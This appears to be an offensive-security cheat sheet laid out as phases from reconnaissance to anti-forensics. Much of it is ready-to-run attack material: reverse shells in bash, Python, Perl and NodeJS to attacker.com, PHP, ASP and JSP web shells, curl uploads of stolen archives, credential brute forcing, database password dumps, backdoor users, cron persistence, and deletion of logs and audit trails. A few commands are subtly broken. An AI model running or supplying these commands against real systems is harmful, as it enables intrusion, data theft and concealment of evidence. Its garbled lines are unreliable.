## Quick Navigation

**FOUNDATION & SYSTEM UTILITIES** (Step 1)
- **System Utilities & Testing Commands** - File analysis, binary inspection, basic system checks

**DISCOVERY PHASE** (Steps 2-4)
- **Reconnaissance & Information Gathering** - Passive recon, DNS, domain info
- **OSINT & Metadata Tools** - Passive intelligence, theHarvester, exiftool

**SCANNING PHASE** (Steps 4-5)
- **Network Scanning & Enumeration** - Find active hosts and services
- **Vulnerability Assessment** - Identify security weaknesses

**EXPLOITATION PHASE** (Steps 6-10)
- **Web Scanning Tools** - Nikto, SQLmap, Burp, OWASP ZAP
- **Exploitation & Post-Exploitation** - Gain initial access
- **Database Exploitation** - MySQL, PostgreSQL, MongoDB
- **Metasploit Framework** - Automated exploitation with meterpreter
- **Privilege Escalation** - Escalate to higher privileges

**POST-EXPLOITATION PHASE** (Steps 11-14)
- **Social Engineering** - Phishing, credential harvesting
- **System & Network Monitoring** - Monitor activity, analyze logs
- **Data Exfiltration** - Steal & compress data, DNS tunneling

**CLEANUP PHASE** (Step 15)
- **Anti-Forensics** - Remove evidence and cover tracks

**EXTENDED OPERATIONS**
- **Red Team Operations** - Full attack lifecycle simulation
- **Bug Bounty Hunting** - Structured reconnaissance + vulnerability discovery

---


## System Utilities & Testing Commands

Essential utilities for system inspection, file analysis, and security testing.

### File & System Testing

**Test file conditions**
```bash
test -f /path/to/file     # File exists
test -d /path/to/dir      # Directory exists
test -r /path/to/file     # File readable
test -w /path/to/file     # File writable
test -x /path/to/binary   # File executable
test -s /path/to/file     # File exists and has size > 0
```
Conditional testing for scripts and security checks.

**View manual pages**
```bash
man ls                     # View command documentation
man -k keyword             # Search manual pages
man 2 open                 # View system call docs
man 3 printf               # View library function docs
```
Access documentation for all commands.

**Determine file type**
```bash
file /path/to/file
file -i /path/to/file     # Show MIME type
```
Identify file format and encoding.

**View file statistics**
```bash
stat /path/to/file
```
Get detailed info: size, permissions, timestamps, inode.

### System information: uname & hostname
Quick commands to learn system/kernel and host identity.

**Kernel / system info (`uname`)**
```bash
uname                # kernel name
uname -a             # all info: kernel, hostname, release, version, machine, OS
uname -r             # kernel release
uname -m             # machine hardware name (architecture)
uname -n             # node/host name (same as hostname)
```

**Hostname / node name (`hostname`)**
> When someone try to retrieve my information so my hostname is visible to attacker.

```bash
hostname             # show current hostname
hostname -f          # show FQDN (fully qualified domain name)
hostnamectl status   # systemd: show/manage hostname and related info
cat /etc/hostname    # static hostname file
```

Tip: For distro details, check `cat /etc/os-release`.

**Extract strings from binaries**
```bash
strings /usr/bin/binary
strings -n 10 /usr/bin/binary    # Minimum 10 characters
```
Find readable text in executables (useful for malware analysis).

### Binary & Library Analysis

**List dynamic libraries**
```bash
ldd /usr/bin/binary
ldd /path/to/executable   # Show required shared libraries
```
Find dependencies for vulnerability research.

**Trace system calls**
```bash
strace /usr/bin/binary
strace -e trace=open,read,write /bin/ls    # Trace specific calls
strace -p <PID>            # Trace running process
```
Monitor what a program does on the system.

**Trace library calls**
```bash
ltrace /usr/bin/binary
ltrace -e malloc /usr/bin/binary    # Trace specific functions
```
Track library function usage for debugging.

**View symbol table**
```bash
nm /usr/bin/binary
nm -D /usr/lib/libc.so.6   # Dynamic symbols
```
See exported functions and symbols.

**Read ELF headers**
```bash
readelf -h /usr/bin/binary          # File header
readelf -S /usr/bin/binary          # Section headers
readelf -l /usr/bin/binary          # Program headers
hexdump -C /usr/bin/binary | head   # Hex dump first lines
```
Analyze executable structure and content.

### File Content Analysis
### Viewing & filtering file contents
```bash
cat file.txt                    # print whole file
cat -n file.txt                 # show line numbers
head -n 20 file.txt             # first 20 lines
tail -n 50 file.txt             # last 50 lines
tail -f /var/log/syslog         # follow appended output
```

**Filter with grep**
```bash
grep 'pattern' file.txt                 # search for pattern (case-sensitive)
grep -i 'pattern' file.txt              # case-insensitive
grep -n 'pattern' file.txt              # show line numbers
grep --color=auto 'pattern' file.txt    # highlight matches
grep -R --exclude-dir=.git 'pattern' /path  # recursive search
cat file.txt | grep 'pattern'           # pipe cat output to grep (equivalent to grep 'pattern' file.txt)
```

### Pager: less
Essential pager for viewing long files and piped output without loading the whole file.

**Basic usage**
```bash
less file
```

**Navigation**
```text
Space       # page down
b           # page up
f           # forward
d / u       # half page down / up
g / G       # go to start / end
/pattern    # search forward
?pattern    # search backward
n / N       # next / previous match
q           # quit
```

**Useful options**
```bash
less -N file      # show line numbers
less -S file      # chop long lines (no wrap)
less -R file      # preserve ANSI color (show colors)
less +F file      # follow output (like tail -f); Ctrl-C to stop
zless file.gz     # view compressed files
```

**Examples**
```bash
less /var/log/syslog
tail -n 200 /var/log/syslog | less -S
ls --color=always | less -R
less -N bigfile.txt
```

### Word count: wc
Count lines, words, and bytes in files or streams.

**Basic usage**
```bash
wc file.txt           # shows lines, words, bytes, filename
wc -l file.txt        # number of lines
wc -w file.txt        # number of words
wc -c file.txt        # number of bytes
wc -m file.txt        # number of characters
wc -L file.txt        # length of longest line
```

**With pipes / examples**
```bash
echo "one two three" | wc -w        # prints 3
grep -oE "\w+" file.txt | wc -l    # count words (approx)
awk '{sum+=NF} END{print sum}' file.txt  # accurate word count using awk
```

## Core Commands Summary
**Hex dump files**
```bash
hexdump -C /tmp/myfile
hexdump -C /tmp/myfile | head -20
```
View binary/text content in hexadecimal format.

**Octal dump**
```bash
od -c /tmp/myfile          # Character dump
od -x /tmp/myfile          # Hex dump
od -b /tmp/myfile          # Byte dump
```
Alternative binary content viewer.

### Directory & Permission Analysis

**Find file locations**
```bash
which bash                 # Find command in PATH
whereis ls                 # Find command, source, man page
```
Locate executables and resources.

**Check file attributes**
```bash
lsattr /path/to/file       # List extended attributes
chattr +i /path/to/file    # Make immutable (requires root)
chattr -i /path/to/file    # Remove immutable flag
```
View and modify immutable/append-only flags.

### Practical Security Use Cases

**Check if port is listening (alternative to netstat)**
```bash
test -S /var/run/docker.sock && echo "Docker socket exists"
```

**Verify binary hasn't been modified**
```bash
sha256sum /usr/bin/binary > checksum.txt
# Later: verify with
sha256sum -c checksum.txt
```

**Find recently modified files**
```bash
find /home -type f -mtime -7   # Modified in last 7 days
```

**Analyze suspicious executable**
```bash
file suspected_binary
strings suspected_binary | grep -i "shell|http|cmd"
ldd suspected_binary
readelf -S suspected_binary
strace suspected_binary 2>&1 | head -50
```

---


## Reconnaissance & Information Gathering

Gather intel about targets before attacking.

### Domain and Host Information

**Find IP of domain**
```bash
nslookup example.com
```
DNS lookup to get target IP.

**Detailed DNS records**
```bash
dig example.com
```
Shows all DNS data.

**WHOIS domain info**
```bash
whois example.com
```
Get domain owner, registrar, dates.

**Reverse DNS**
```bash
dig -x 192.168.1.1
```
Find hostname from IP.

### Network Scanning

**Ping a network range**
```bash
ping -c 1 192.168.1.1
```
Test if host is alive.

**Ping sweep (find active hosts)**
```bash
for i in {1..254}; do ping -c1 192.168.1.$i & done
```
Find all active IPs in subnet.

### Passive Information

**Check DNS servers**
```bash
cat /etc/resolv.conf
```
See which DNS your target uses.

**Test connectivity**
```bash
mtr google.com
```
Live trace route to target.

---


## OSINT & Metadata Tools

Gather intelligence without touching the target.

### Email & User Harvesting

**Find emails for domain**
```bash
theHarvester -d example.com -b google
```
Harvests emails from Google, Bing, etc.

**Find subdomains**
```bash
theHarvester -d example.com -b all
```
Passive subdomain enumeration.

### Metadata Extraction

**Extract metadata from files**
```bash
exiftool document.pdf
```
Get hidden metadata (author, dates, GPS).

**Batch extract from images**
```bash
exiftool *.jpg
```
Extract all image metadata.

**Remove metadata**
```bash
exiftool -all= document.pdf
```
Strip sensitive metadata.

### Shodan (Internet Search Engine)

**Search Shodan CLI**
```bash
shodan search apache
```
Find systems running Apache.

**Find webcams**
```bash
shodan search webcam
```
Locate exposed cameras.

**Get host info**
```bash
shodan host 1.2.3.4
```
Get details about IP from Shodan.

### Passive DNS & IP Info

**Check IP reputation**
```bash
curl https://api.abuseipdb.com/api/v2/check?ipAddress=1.2.3.4
```
Check if IP is blacklisted.

**Find DNS history**
```bash
dig +nocmd example.com +noall +answer
```
Check DNS records.

---

Find open ports and running services.

### Port Scanning with Nmap

**Basic port scan**
```bash
nmap example.com
```
Scan most common 1000 ports.

**Scan specific ports**
```bash
nmap -p 22,80,443,3306 example.com
```
Check only these ports (SSH, HTTP, HTTPS, MySQL).

**Scan ALL ports**
```bash
nmap -p- example.com
```
Check all 65,535 ports (slow!).

**Service version detection**
```bash
nmap -sV example.com
```
Identify what software is running.

**OS detection**
```bash
nmap -O example.com
```
Guess operating system.

**Aggressive scan (VERY LOUD)**
```bash
nmap -A example.com
```
Service, OS, script scan, traceroute.

**UDP scan**
```bash
nmap -sU example.com
```
Scan UDP ports.

**Scan through firewall**
```bash
nmap -Pn example.com
```
Don't ping first, just scan.

**Stealth scan (slower)**
```bash
nmap -sS example.com
```
SYN scan, less likely to be logged.

**Save output**
```bash
nmap -A example.com -oN scan.txt
```
Save results to file.

### Service Enumeration

**Check SMB shares**
```bash
smbclient -L //192.168.1.1
```
List network shares.

**Check HTTP headers**
```bash
curl -I https://example.com
```
Get server info and headers.

**Check HTTP methods**
```bash
curl -X OPTIONS -v https://example.com
```
See what HTTP methods allowed.

---


## Vulnerability Assessment

Find security weaknesses.

### Web Vulnerability Scanning

**Check SSL/TLS**
```bash
openssl s_client -connect example.com:443
```
Check certificate and SSL version.

**Check HTTP methods**
```bash
nmap --script http-methods example.com
```
Find dangerous HTTP methods.

**Subdomain enumeration**
```bash
nmap -sL example.com
```
Find subdomains.

### Common Weak Services

**Check Telnet (insecure)**
```bash
telnet example.com 23
```
Test unencrypted access.

**Check FTP**
```bash
ftp example.com
```
Test FTP access (unencrypted).

**Check default credentials**
```bash
nmap -p 3389 --script rdp-enum-encryption 192.168.1.1
```
Find RDP weaknesses.

---


## Web Scanning Tools

Automated web application vulnerability testing.

### Nikto Web Server Scanner

**Basic web scan**
```bash
nikto -h http://example.com
```
Scan for web vulnerabilities.

**Scan with proxy**
```bash
nikto -h http://example.com -useproxy http://127.0.0.1:8080
```
Use Burp Suite proxy.

### SQLmap - SQL Injection

**Find SQL injection**
```bash
sqlmap -u "http://example.com/search.php?q=test" --dbs
```
Test for SQLi and enumerate databases.

**Dump database**
```bash
sqlmap -u "http://example.com/search.php?q=test" -D database_name -T users --dump
```
Extract user table.

**Interactive shell**
```bash
sqlmap -u "http://example.com/search.php?q=test" --os-shell
```
Get OS command execution.

### Burp Suite

**Start proxy**
```bash
burpsuite &
```
Launch Burp (set to 127.0.0.1:8080).

**Use proxy with curl**
```bash
curl -x http://127.0.0.1:8080 http://example.com
```
Route traffic through Burp.

### OWASP ZAP

**Start ZAP**
```bash
zaproxy &
```
Launch OWASP ZAP.

**Automated scan**
```bash
zap-cli scan -r report.html http://example.com
```
Full web app scan with report.

---


## Database Exploitation

Attack databases directly.

### MySQL Enumeration & Exploitation

**Connect to MySQL**
```bash
mysql -h 192.168.1.5 -u root -p
```
Connect to MySQL server.

**No password needed?**
```bash
mysql -h 192.168.1.5 -u root
```
Sometimes no auth required.

**Enumerate databases**
```bash
mysql -h 192.168.1.5 -u root -p -e "SHOW DATABASES;"
```
List all databases.

**Get users and passwords**
```bash
mysql -h 192.168.1.5 -u root -p -e "SELECT user, password FROM mysql.user;"
```
Dump MySQL users.

**Read files**
```bash
mysql -h 192.168.1.5 -u root -p -e "LOAD_FILE('/etc/passwd')"
```
Read files via MySQL.

### PostgreSQL Exploitation

**Connect to PostgreSQL**
```bash
psql -h 192.168.1.5 -U postgres
```
Connect to PostgreSQL.

**List databases**
```bash
psql -h 192.168.1.5 -U postgres -c "SELECT datname FROM pg_database WHERE datistemplate = false;"
```
Enumerate databases.

**Get table contents**
```bash
psql -h 192.168.1.5 -U postgres -d database_name -c "SELECT * FROM table_name;"
```
Dump table data.

**Execute commands**
```bash
psql -h 192.168.1.5 -U postgres -c "CREATE FUNCTION exec(text) returns text AS 'select system($1)' language SQL;"
```
Code execution via UDF.

### MongoDB Exploitation

**Connect to MongoDB**
```bash
mongo 192.168.1.5:27017
```
Connect to MongoDB.

**List databases**
```bash
mongo 192.168.1.5:27017/admin --eval "db.adminCommand('listDatabases')"
```
Show all databases.

**Dump collection**
```bash
mongo 192.168.1.5:27017/database_name --eval "db.collection_name.find().pretty()"
```
Export collection data.

**Check authentication**
```bash
mongo 192.168.1.5:27017
use admin
db.getUsers()
```
See if authentication is enabled.

---

Common techniques for gaining access.

### Credential Attacks

**Brute force SSH**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://example.com
```
Try passwords against SSH.

**HTTP basic auth brute force**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-basic://example.com
```
Try passwords on HTTP auth.

**Crack password hashes**
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
Hash cracking with dictionary.

### File Transfer for Exploitation

**Copy exploitation tool**
```bash
scp exploit.sh user@target:/tmp/
```
Transfer script to target.

**Download file from target**
```bash
scp user@target:/etc/passwd ./
```
Get files from target.

**Download with curl**
```bash
curl -O http://attacker.com/shell.sh
```
Download shell.

### Reverse Shells

**Bash reverse shell**
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```
Connect back to attacker.

**Python reverse shell**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
Python shell connection.

**Listener for reverse shell**
```bash
nc -lvnp 4444
```
Listen for incoming connection on port 4444.

### Web Shells & Payloads

**Simple PHP web shell**
```php
<?php system($_GET['cmd']); ?>
```
Save as shell.php, access: `http://target/shell.php?cmd=id`

**ASP web shell**
```asp
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```
For Windows IIS servers.

**JSP web shell**
```jsp
<%@ page import="java.io.*" %>
<% 
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while ((line = br.readLine()) != null) { out.println(line + "<br>"); }
%>
```
For Java servers.

**One-liner NodeJS payload**
```bash
require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
```

**Perl reverse shell**
```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

---


## Metasploit Framework

Automated exploitation framework.

### MSFConsole Basics

**Start MSFConsole**
```bash
msfconsole
```
Launch Metasploit.

**Search for exploits**
```bash
msf> search type:exploit platform:linux
```
Find exploits in Metasploit.

**Load exploit**
```bash
msf> use exploit/linux/http/openssh_backdoor
```
Select an exploit.

**Show options**
```bash
msf> show options
```
See required parameters.

**Set target**
```bash
msf> set RHOSTS 192.168.1.5
msf> set RPORT 22
```
Specify target.

**Run exploit**
```bash
msf> run
```
Execute the exploit.

### Meterpreter Commands

**Get system info**
```
meterpreter> sysinfo
```
System information.

**Get shell**
```
meterpreter> shell
```
Drop to normal shell.

**Upload files**
```
meterpreter> upload /tmp/payload.sh /tmp/
```
Upload to target.

**Download files**
```
meterpreter> download /etc/passwd /tmp/
```
Download from target.

**Dump hashes**
```
meterpreter> hashdump
```
Get SAM hashes (Windows).

**Migrate process**
```
meterpreter> migrate explorer.exe
```
Move to another process.

**Create persistence**
```
meterpreter> persistence -X -i 10 -p 4444 -r attacker.com
```
Restart handler on reboot.

---

Full team-based attack scenarios.

### Initial Access

**Check for web vulnerabilities (manual)**
```bash
curl https://example.com/admin.php
```
Probe for admin pages.

**Directory brute force**
```bash
dirbuster -u http://example.com -l /usr/share/wordlists/common.txt
```
Find hidden directories.

**SQL Injection test**
```bash
curl "http://example.com/search.php?q=1' OR '1'='1"
```
Test for SQL injection.

### Lateral Movement

**Check local network**
```bash
arp -a
```
Find other systems on network.

**Find trusts between systems**
```bash
nltest /domain_trusts
```
Windows domain trusts (if on Windows).

**List network services**
```bash
ss -tulnp
```
Find listening services.

### Persistence

**Add SSH key (stay in system)**
```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```
Add SSH key for access.

**Create user account**
```bash
sudo useradd -m -s /bin/bash hacker
```
Create backdoor user.

**Setup cron job persistence**
```bash
(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -
```
Run command every minute.

### Covering Tracks

**Clear bash history**
```bash
history -c
rm ~/.bash_history
```
Remove command history.

**Clear logs**
```bash
sudo rm /var/log/auth.log
```
**These are ONLY for authorized testing!**
 - Get written permission FIRST
 - Only test systems you own or have signed authorization

---


## Privilege Escalation

Gain higher access levels.

### Check Current Privileges

**Who am I?**
```bash
whoami
id
```
Shows current user and groups.

**Can I run sudo?**
```bash
sudo -l
```
Check sudo permissions.

**Find SUID binaries**
```bash
find / -perm -4000 2>/dev/null
```
Find programs running as root.

**Check kernel version**
```bash
uname -a
```
Old kernels have exploits.

### Escalation Techniques

**Use sudo without password**
```bash
sudo bash
```
Execute command as root (if allowed).

**Exploit weak sudo permissions**
```bash
sudo /usr/bin/nano
```
If you can run editor as sudo, type shell commands.

**Find password in files**
```bash
find / -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | xargs grep -l password
```
Search for hardcoded passwords.

**Check cron jobs**
```bash
crontab -l
cat /etc/cron.d/*
```
Find scripts you can modify.

**Check directory permissions**
```bash
ls -la /opt
ls -la /tmp
```
Find writable directories.

---


## Social Engineering

Tactics to compromise humans instead of systems.

### Phishing Tools

**Create phishing email template**
```bash
# Using msfconsole
msfconsole
msf> search phishing
msf> use exploit/windows/fileformat/office_word_hta
```

**Check for social media info**
```bash
curl https://api.github.com/users/username
```
Find GitHub info leakage.

**Email enumeration**
```bash
theHarvester -d example.com -b all
```
Find valid email addresses.

### Credential Harvesting

**Create fake login page**
```bash
setoolkit
# Choose: Social Engineering Attacks > Website Attack Vectors
# > Credential Harvester Attack Method
```
SET creates fake login pages.

**Payload delivery**
```bash
python -m SimpleHTTPServer 8080
```
Host malicious files.

---


## System & Network Monitoring

Monitor for activity and evidence.

### Real-time Monitoring

**Watch processes**
```bash
top
```
Live process monitor.

**Watch file access**
```bash
tail -f /var/log/auth.log
```
See login attempts.

**Monitor ports**
```bash
ss -tulnp
```
See what's listening.

### Log Analysis

**View login history**
```bash
last
```
See who logged in.

**Check sudo usage**
```bash
sudo cat /var/log/auth.log | grep sudo
```
See sudo commands (if logged in).

**Find recent files**
```bash
find / -type f -newermt "2026-05-20" 2>/dev/null
```
Find files modified after date.

### Network Monitoring

**Capture traffic**
```bash
sudo tcpdump -i eth0 -n
```
Live packet capture.

**Capture to file**
```bash
sudo tcpdump -i eth0 -w capture.pcap
```
Save traffic for analysis.

**Filter specific traffic**
```bash
sudo tcpdump -i eth0 -n "port 80"
```
Capture HTTP only.

---


## Data Exfiltration

Methods to steal data from targets.

### File Transfer Methods

**Exfiltrate via DNS**
```bash
exfil -f /etc/passwd -d example.com
```
Hide data in DNS queries.

**Compress and upload**
```bash
tar czf sensitive.tar.gz /var/www/html/
curl -F "file=@sensitive.tar.gz" http://attacker.com/upload.php
```
Compress before exfil.

**Split large files**
```bash
split -b 1M largefile.zip largefile.zip.
for i in largefile.zip.*; do curl -F "file=@$i" http://attacker.com/upload.php; done
```
Upload in chunks.

### Covert Channels

**Use ICMP for data transfer**
```bash
icmptunnel -s 192.168.1.5
icmptunnel -c example.com
```
Tunnel data through ICMP.

**Use DNS tunneling**
```bash
dnscat2
dnscat2 -l 127.0.0.1
```
Data exfil via DNS.

### Database Dumping

**Dump MySQL database**
```bash
mysqldump -h 192.168.1.5 -u root -p database_name > dump.sql
```
Export full database.

**Large file theft**
```bash
dd if=/dev/sda | gzip > disk_image.gz
tar czf /var/www/html/index.html > /tmp/archive.tar.gz
```
Steal entire files/disks.

---


## Anti-Forensics

Remove evidence of exploitation.

### Log Deletion

**Clear system logs**
```bash
rm /var/log/auth.log
rm /var/log/syslog
rm /var/log/apache2/access.log
```
Remove access evidence.

**Clear command history**
```bash
history -c
history -w
cat /dev/null > ~/.bash_history
rm ~/.bash_history
```
Hide commands run.

**Clear shell history**
```bash
ln -sf /dev/null ~/.bash_history
shred -vfz -n 3 ~/.bash_history
```
Prevent history recovery.

### Timeline Cleanup

**Change file timestamps**
```bash
touch -acmdt 202601010000 /tmp/shell.sh
```
Change to older date.

**Fabricate false timestamps**
```bash
touch -d "1 month ago" filecopy.php
```
Make file look old.

### Track Covering

**Clear Linux audit logs**
```bash
auditctl -e 0
rm /var/log/audit/audit.log
```
Disable and clear auditd.

**Clear firewall logs**
```bash
iptables -Z
echo > /var/log/ufw.log
```
Clear firewall entries.

**Windows log clearing**
```bash
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```
Clear Windows Event Logs.

### Artifact Removal

**Delete temp files**
```bash
shred -vfz -n 5 /tmp/*
```
Secure file deletion.

**Find suspicious files**
```bash
find / -name "^shell*" -o -name "*backdoor*" 2>/dev/null
```
Locate malicious files.

**Remove backdoor user**
```bash
userdel -r backdoor_account
```
Remove created users.

---

Find vulnerabilities for legal financial reward.

### Recon Phase

**Gather subdomains**
```bash
nslookup -type=A example.com
dig example.com +short
```
Find all subdomains.

**Check wayback machine**
```bash
curl -s "https://archive.org/wayback/available?url=example.com" | grep snapshot
```
Find old versions of site.

**Find endpoints**
```bash
curl -s http://example.com/robots.txt
```
Check robots.txt for hints.

### Vulnerability Discovery

**Test for XSS**
```bash
curl "http://example.com/search?q=<script>alert(1)</script>"
```
Test reflected XSS.

**Test SSRF**
```bash
curl "http://example.com/image?url=http://127.0.0.1:8080"
```
Try local address access.

**Check headers**
```bash
curl -v http://example.com 2>&1 | grep -i security
```
Find missing security headers.

**Subdomain takeover check**
```bash
nslookup sub.example.com
```
Check if subdomain resolves.

### API Testing

**Enumerate API endpoints**
```bash
curl -s http://example.com/api/
```
Find API base.

**Test parameter manipulation**
```bash
curl "http://example.com/api/user/1" -H "Authorization: Bearer token"
```
Test API authentication.

### Exploitation Notes

**Screenshot for POC**
```bash
curl -s http://example.com | head
```
Capture vulnerable response.

---


## Secure Communication

Safe communication for red team.

### Encryption

**Create encrypted file**
```bash
gpg -c secret.txt
```
Encrypt with password.

**Decrypt file**
```bash
gpg secret.txt.gpg
```
Decrypt file.

**SSH with key**
```bash
ssh -i private_key.pem user@example.com
```
Use SSH key instead of password.

### VPN and Tunneling

**SSH tunnel through firewall**
```bash
ssh -L 8080:internal.service:80 user@jumphost
```
Forward local port to internal service.

---


## Quick Reference by Role

### Ethical Hacker
- Nmap scanning
- Vulnerability assessment
- Exploitation with permission
- Document findings

### Red Team
- Full attack chain
- Lateral movement
- Persistence
- Clean exit

### Security Researcher
- Vulnerability discovery
- Proof of concept
- Documentation
- Responsible disclosure

### Bug Bounty Hunter
- Reconnaissance
- Vulnerability hunting
- Proof of concept
- Report to company

---


## CRITICAL LEGAL WARNINGS

**These are ONLY for authorized testing!**
- Get written permission FIRST
- Only test systems you own or have signed authorization
- Unauthorized access is **FEDERAL CRIME**
- Document everything
- Never access data beyond scope
- Report responsibly

---


## Core Commands Summary

| Purpose | Command |
| --- | --- |
| **OSINT** | |
| Email harvesting | `theHarvester -d example.com -b all` |
| Metadata extraction | `exiftool document.pdf` |
| Shodan search | `shodan host 1.2.3.4` |
| **Scanning** | |
| Port scan | `nmap -p- example.com` |
| Service detection | `nmap -sV example.com` |
| Stealth scan | `nmap -sS example.com` |
| Web scanner | `nikto -h http://example.com` |
| **Web Apps** | |
| SQL injection | `sqlmap -u "url" --dbs` |
| Directory brute force | `dirbuster -u http://example.com -l wordlist.txt` |
| Burp proxy | `curl -x http://127.0.0.1:8080 http://target` |
| **Databases** | |
| MySQL connect | `mysql -h 1.2.3.4 -u root -p` |
| PostgreSQL enum | `psql -h 1.2.3.4 -U postgres -c "SHOW DATABASES;"` |
| MongoDB dump | `mongo 1.2.3.4:27017 --eval "db.collection_name.find().pretty()"` |
| **Exploitation** | |
| Brute force | `hydra -l user -P wordlist.txt ssh://target` |
| Hash crack | `hashcat -m 1000 hashes.txt rockyou.txt` |
| Reverse shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` |
| Web shell | `<?php system($_GET['cmd']); ?>` |
| SSH tunnel | `ssh -L 8080:internal:80 user@jumphost` |
| **Metasploit** | |
| Start MSF | `msfconsole` |
| Search exploit | `msf> search type:exploit` |
| Run exploit | `msf> run` |
| Meterpreter | `meterpreter> hashdump` |
| **Privilege Escalation** | |
| Check sudo | `sudo -l` |
| Find SUID | `find / -perm -4000 2>/dev/null` |
| Kernel exploit | `uname -a` (find CVE) |
| **Exfiltration** | |
| Copy file | `scp file user@target:/tmp/` |
| Compress | `tar czf data.tar.gz /var/www/` |
| DNS exfil | `dnscat2 -c attacker.com` |
| **Anti-Forensics** | |
| Clear history | `history -c; rm ~/.bash_history` |
| Change timestamp | `touch -acmdt 202601010000 file.php` |
| Secure delete | `shred -vfz -n 5 /tmp/shell.sh` |
| **Monitoring** | |
| Watch logs | `tail -f /var/log/auth.log` |
| Capture packets | `tcpdump -i eth0 -n` |
| Active processes | `ps aux` |
| Network connections | `ss -tulnp` |

---


## Recommended Tools & Wordlists

### Essential Tools
- **Nmap** - Port and service scanning
- **Metasploit** - Exploitation framework
- **Burp Suite** - Web app testing
- **SQLmap** - SQL injection tester
- **Hydra** - Credential brute forcing
- **Hashcat** - Hash cracking
- **theHarvester** - Passive OSINT
- **exiftool** - Metadata extraction
- **tcpdump** - Packet capture
- **Wireshark** - Packet analysis

### Wordlist Location
Located in `/usr/share/wordlists/`:
- `rockyou.txt` - Most common passwords (14M+ entries)
- `common.txt` - Common usernames
- `dirb/big.txt` - Directory brute force (20K+ entries)
- `dirb/common.txt` - Common directories
- `fasttrack.txt` - Fast password crack

### Download Custom Wordlists
```bash
wget https://github.com/danielmiessler/SecLists/archive/master.zip
```
SecLists - huge collection for fuzzing

---


## Complete Security Testing Workflow

**Phase 1: Reconnaissance**
- Passive OSINT (theHarvester, Shodan, exiftool)
- Domain enumeration (dig, nslookup, whois)
- Metadata extraction and analysis

**Phase 2: Scanning**
- Network discovery (ping sweep, arp-scan)
- Port scanning (nmap with various flags)
- Service enumeration (version detection)

**Phase 3: Vulnerability Assessment**
- Web app scanning (Nikto, Burp, OWASP ZAP)
- Database enumeration (MySQL, PostgreSQL, MongoDB)
- SSL/TLS analysis, default credentials

**Phase 4: Exploitation**
- SQL injection (sqlmap)
- Reverse shells (Bash, Python, Perl)
- Web shells (PHP, ASP, JSP)
- Metasploit framework

**Phase 5: Post-Exploitation**
- Privilege escalation (SUID, sudo, kernel exploits)
- Persistence (SSH keys, cron jobs, users)
- Lateral movement (network enumeration, trust analysis)

**Phase 6: Data Extraction**
- Database dumping (complete data theft)
- File exfiltration (compression, covert channels)
- Credential theft (hashes, plaintext)

**Phase 7: Track Covering**
- Log deletion (auth, syslog, apache)
- History clearing (bash, command history)
- Timestamp manipulation (touch, exiftool)
- Artifact removal (backup users, temp files)

---

